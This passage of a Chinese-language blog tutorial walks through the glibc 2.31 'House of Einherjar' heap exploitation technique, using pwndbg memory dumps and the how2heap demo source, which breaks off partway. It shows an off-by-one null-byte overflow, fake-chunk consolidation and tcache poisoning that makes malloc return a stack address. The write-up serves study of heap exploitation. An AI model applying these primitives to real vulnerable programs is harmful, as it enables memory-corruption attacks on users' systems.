class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x40</span>                 Used                None              None</span><br><span class="line"><span class="number">0x5555555592d0</span>      <span class="number">0x0</span>                 <span class="number">0x30</span>                 Freed                <span class="number">0x0</span>               <span class="number">0x0</span></span><br><span class="line"><span class="number">0x555555559300</span>      <span class="number">0x0</span>                 <span class="number">0x100</span>                Used                None              None</span><br></pre></td></tr></table></figure><p>由于我们在  chunk a 的位置放了一个 fake chunk，我们此时修改了 chunk c的size 位置，同时我们需要其 prev_size 合法，所以也要修改 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">83</span>     <span class="comment">// Write a fake prev_size to the end of b</span></span><br><span class="line">  <span class="number">84</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of &#x27;b&#x27; so that &quot;</span></span><br><span class="line">  <span class="number">85</span>            <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line">  <span class="number">86</span>     <span class="keyword">size_t</span> fake_size = (<span class="keyword">size_t</span>)((c - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>) - (<span class="keyword">uint8_t</span>*) a);</span><br><span class="line">► <span class="number">87</span>     <span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, c - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>, a, fake_size);</span><br><span class="line">  <span class="number">88</span>     *(<span class="keyword">size_t</span>*) &amp;b[real_b_size-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)] = fake_size;</span><br></pre></td></tr></table></figure><p>我们将 chunk b的preve size 修改为 0x60</p><p>紧接着，照样填满 tcache,  然后我们去free chunk c，由于 chunk c 的 prev_inused 为0，则认为前面的 chunk 是free 的此时会有一个向前合并的过程,这样我们就会有两个指针指向 fake chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p c</span><br><span class="line">$<span class="number">18</span> = (<span class="keyword">uint8_t</span> *) <span class="number">0x555555559310</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x5555555592a0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdi  <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x5555555592a8</span> ◂— <span class="number">0x161</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x5555555592b0</span> —▸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x555555559b00</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x5555555592c0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x5555555592d8</span> ◂— <span class="number">0x31</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$<span class="number">19</span> = (<span class="keyword">intptr_t</span> *) <span class="number">0x5555555592a0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后我们此时再 malloc 一个 0x158 大小的chunk ，合并后大小为 0x160, 然后此时 合并后的 chunk 就会被整块取出,  </p><p>然后我们在进行如下操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">119</span>     <span class="keyword">uint8_t</span> *pad = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="number">120</span>     <span class="built_in">free</span>(pad);</span><br><span class="line">  <span class="number">121</span></span><br><span class="line">► <span class="number">122</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nNow we free chunk &#x27;b&#x27; to launch a tcache poisoning attack\n&quot;</span>);</span><br><span class="line">  <span class="number">123</span>     <span class="built_in">free</span>(b);</span><br></pre></td></tr></table></figure><p>那么此时  chunk b 也会加入到  tcache bin里，且指向了刚 free 的 pad chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p b</span><br><span class="line">$<span class="number">25</span> = (<span class="keyword">uint8_t</span> *) <span class="number">0x5555555592e0</span> <span class="string">&quot;\020\233UUUU&quot;</span></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x30</span> [  <span class="number">2</span>]: <span class="number">0x5555555592e0</span> —▸ <span class="number">0x555555559b10</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x100</span> [  <span class="number">7</span>]: <span class="number">0x555555559a10</span> —▸ <span class="number">0x555555559910</span> —▸ <span class="number">0x555555559810</span> —▸ <span class="number">0x555555559710</span> —▸ <span class="number">0x555555559610</span> —▸ <span class="number">0x555555559510</span> —▸ <span class="number">0x555555559410</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br></pre></td></tr></table></figure><p>由于， chunk d 可对 chunkb进行任意修改 （堆块重叠了）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x5555555592b0</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x5555555592a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000161</span>      =====&gt; chunk d</span><br><span class="line"><span class="number">0x5555555592b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000031</span>      =====&gt; fake chunk <span class="keyword">and</span> chunk b</span><br><span class="line"><span class="number">0x5555555592e0</span>:<span class="number">0x0000555555559b10</span><span class="number">0x0000555555559010</span>         ----&gt; chunk b fd -&gt; <span class="number">0x0000555555559b10</span></span><br><span class="line"><span class="number">0x5555555592f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559300</span>:<span class="number">0x0000000000000060</span><span class="number">0x0000000000000100</span>      =====&gt; chunk c</span><br><span class="line"><span class="number">0x555555559310</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559320</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559330</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559340</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>我们通过修改 chunk d 的内容来达到 修改 chunk b 的 fd 指针的目的，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_einherjar.c</span><br><span class="line">   <span class="number">125</span></span><br><span class="line">   <span class="number">126</span>     <span class="built_in">printf</span>(<span class="string">&quot;We overwrite b&#x27;s fwd pointer using chunk &#x27;d&#x27;\n&quot;</span>);</span><br><span class="line">   <span class="number">127</span>     d[<span class="number">0x30</span> / <span class="number">8</span>] = (<span class="keyword">long</span>) stack_var;</span><br><span class="line">   <span class="number">128</span></span><br><span class="line">   <span class="number">129</span>     <span class="comment">// take target out</span></span><br><span class="line"> ► <span class="number">130</span>     <span class="built_in">printf</span>(<span class="string">&quot;Now we can cash out the target chunk.\n&quot;</span>);</span><br><span class="line">   <span class="number">131</span>     <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">   <span class="number">132</span>     <span class="keyword">intptr_t</span> *e = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">   <span class="number">133</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nThe new chunk is at %p\n&quot;</span>, e);</span><br><span class="line">   <span class="number">134</span></span><br><span class="line">   <span class="number">135</span>     <span class="comment">// sanity check</span></span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffe210</span> ◂— <span class="number">0x700000000</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffe218</span> ◂— <span class="number">0x2800000007</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffe220</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffe228</span> —▸ <span class="number">0x5555555592e0</span> —▸ <span class="number">0x7fffffffe260</span> —▸ <span class="number">0x555555554040</span> ◂— <span class="number">0x400000006</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffe230</span> —▸ <span class="number">0x555555559310</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffe238</span> —▸ <span class="number">0x555555559308</span> ◂— <span class="number">0x100</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffe240</span> ◂— <span class="number">0x60</span> <span class="comment">/* &#x27;`&#x27; */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffe248</span> —▸ <span class="number">0x5555555592b0</span> ◂— <span class="number">0x0</span></span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">55555555571</span>e main+<span class="number">1269</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x5555555592b0</span></span><br><span class="line"><span class="number">0x5555555592b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5555555592e0</span>:<span class="number">0x00007fffffffe260</span><span class="number">0x0000555555559010</span></span><br><span class="line"><span class="number">0x5555555592f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559300</span>:<span class="number">0x0000000000000060</span><span class="number">0x0000000000000100</span></span><br></pre></td></tr></table></figure><p>最后我们只需两次 malloc 就能拿到目标地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">129</span>     <span class="comment">// take target out</span></span><br><span class="line">  <span class="number">130</span>     <span class="built_in">printf</span>(<span class="string">&quot;Now we can cash out the target chunk.\n&quot;</span>);</span><br><span class="line">► <span class="number">131</span>     <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="number">132</span>     <span class="keyword">intptr_t</span> *e = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="number">133</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nThe new chunk is at %p\n&quot;</span>, e);</span><br></pre></td></tr></table></figure><p>完整代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This modification to The House of Enherjar works with the tcache-option enabled on glibc-2.31.</span></span><br><span class="line"><span class="comment">     * The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc().</span></span><br><span class="line"><span class="comment">     * It has the additional requirement of a heap leak. </span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * After filling the tcache list to bypass the restriction of consolidating with a fake chunk,</span></span><br><span class="line"><span class="comment">     * we target the unsorted bin (instead of the small bin) by creating the fake chunk in the heap.</span></span><br><span class="line"><span class="comment">     * The following restriction for normal bins won&#x27;t allow us to create chunks bigger than the memory</span></span><br><span class="line"><span class="comment">     * allocated from the system in this arena:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;f=malloc/malloc.c;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c */</span></span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to House of Einherjar 2!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Tested on Ubuntu 20.04 64bit (glibc-2.31).\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">           <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="keyword">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nThe address we want malloc() to return is %p.\n&quot;</span>, (<span class="keyword">char</span> *) &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27; and use it to create a fake chunk\n&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create a fake chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk preferably before the chunk(s) we want to overlap, and we must know its address.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    a[<span class="number">0</span>] = <span class="number">0</span>;    <span class="comment">// prev_size (Not Used)</span></span><br><span class="line">    a[<span class="number">1</span>] = <span class="number">0x60</span>; <span class="comment">// size</span></span><br><span class="line">    a[<span class="number">2</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// fwd</span></span><br><span class="line">    a[<span class="number">3</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// bck</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prev_size (not used): %#lx\n&quot;</span>, a[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: %#lx\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fwd: %#lx\n&quot;</span>, a[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bck: %#lx\n&quot;</span>, a[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x28 bytes for &#x27;b&#x27;.\n&quot;</span></span><br><span class="line">           <span class="string">&quot;This chunk will be used to overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span></span><br><span class="line">           <span class="string">&quot;After this chunk is overlapped, it can be freed and used to launch a tcache poisoning attack.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">uint8_t</span> *b = (<span class="keyword">uint8_t</span> *) <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;b&#x27;, we need the &#x27;real&#x27; size of &#x27;b&#x27; after rounding: %#x\n&quot;</span>, real_b_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment">     * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span></span><br><span class="line"><span class="comment">     * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0xf8 bytes for &#x27;c&#x27;.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">uint8_t</span> *c = (<span class="keyword">uint8_t</span> *) <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span>* c_size_ptr = (<span class="keyword">uint64_t</span>*)(c - <span class="number">8</span>);</span><br><span class="line">    <span class="comment">// This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nc.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span>);</span><br><span class="line">    b[real_b_size] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;It is easier if b.size is a multiple of 0x100 so you &quot;</span></span><br><span class="line">           <span class="string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write a fake prev_size to the end of b</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of &#x27;b&#x27; so that &quot;</span></span><br><span class="line">           <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line">    <span class="keyword">size_t</span> fake_size = (<span class="keyword">size_t</span>)((c - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>) - (<span class="keyword">uint8_t</span>*) a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, c - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>, a, fake_size);</span><br><span class="line">    *(<span class="keyword">size_t</span>*) &amp;b[real_b_size-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Change the fake chunk&#x27;s size to reflect c&#x27;s new prev_size</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nMake sure that our fake chunk&#x27;s size is equal to c&#x27;s new prev_size.\n&quot;</span>);</span><br><span class="line">    a[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Now we fill the tcache before we free chunk &#x27;c&#x27; to consolidate with our fake chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nFill tcache.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++) &#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache list.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we free &#x27;c&#x27; and this will consolidate with our fake chunk since &#x27;c&#x27; prev_inuse is not set\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (c.size + fake_prev_size)\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *d = <span class="built_in">malloc</span>(<span class="number">0x158</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Next malloc(0x158) is at %p\n&quot;</span>, d);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// tcache poisoning</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">           <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">uint8_t</span> *pad = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">free</span>(pad);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nNow we free chunk &#x27;b&#x27; to launch a tcache poisoning attack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, pad);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We overwrite b&#x27;s fwd pointer using chunk &#x27;d&#x27;\n&quot;</span>);</span><br><span class="line">    d[<span class="number">0x30</span> / <span class="number">8</span>] = (<span class="keyword">long</span>) stack_var;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we can cash out the target chunk.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    